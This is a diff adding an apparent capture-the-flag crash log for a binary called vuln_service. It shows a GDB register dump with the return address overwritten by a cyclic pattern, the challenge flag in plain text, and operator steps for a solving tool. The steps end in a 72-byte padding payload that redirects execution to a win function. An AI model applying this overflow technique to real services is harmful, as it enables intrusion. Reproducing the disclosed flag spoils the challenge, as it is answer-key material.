@@ -1,0 +1,21 @@
+=== PWN CRASH LOG / GDB EXPLOIT TELEMETRY ===
+Target: ./vuln_service
+Signal: SIGSEGV (Segmentation Fault - Invalid Memory Address)
+
+Registers State at Crash:
+RAX: 0x0000000000000000
+RBX: 0x0000000000000000
+RCX: 0x00007ffff7eccd80
+RDX: 0x0000000000000000
+RBP: 0x6161617261616171 ('qaaaraaa')
+RIP: 0x61616173 ('saaa')
+
+[!] Crash Instruction: 0x401168 <main+38>: ret
+[!] Overwritten RIP Value: 0x61616173 or 'saaa'
+[!] Challenge Flag: flag{pwn_cyclic_eip_offset_control_7272}
+
+INSTRUCTIONS FOR SHADOW CAT OPERATOR:
+1. Go to ShadowSolve UI -> 'Binary & Pwn' menu -> 'Cyclic Offset Finder' tab.
+2. Input '0x61616173' or 'saaa' in the Pattern field.
+3. The engine will instantly calculate exact offset: 72 bytes.
+4. Exploit padding string: 'A' * 72 + p64(win_addr)
